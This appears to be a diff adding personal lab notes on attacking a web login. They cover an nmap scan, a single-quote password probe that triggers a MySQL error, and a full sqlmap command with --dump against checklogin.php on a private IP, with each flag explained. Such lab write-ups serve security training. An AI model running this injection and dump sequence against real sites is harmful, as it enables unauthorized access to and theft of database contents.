@@ -1,3 +1,23 @@
 NMAP target - shows port 80 open running webserver
 
+UNAME = admin
+PASSWD = '
 
+ERROR MESSAGE from login
+Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
+
+shows mySQL error - vulnerable to SQL injection
+
+URL changes to http://192.168.32.49/checklogin.php
+
+///////////////////
+SQLmap
+
+COMMAND USED
+sqlmap -u "http://192.168.32.49/checklogin.php" --dbms=MySQL --level=5 --risk=3 --data="myusername=admin&mypassword=test" --dump
+
+-u = Specify target URL
+-dbms=MySQL = specify type of SQL server running
+--risk=3 = detection more likely if higher as performs risky attacks
+--data = specify what data to query to the SQL server
+--dump = display all info after scan has finished
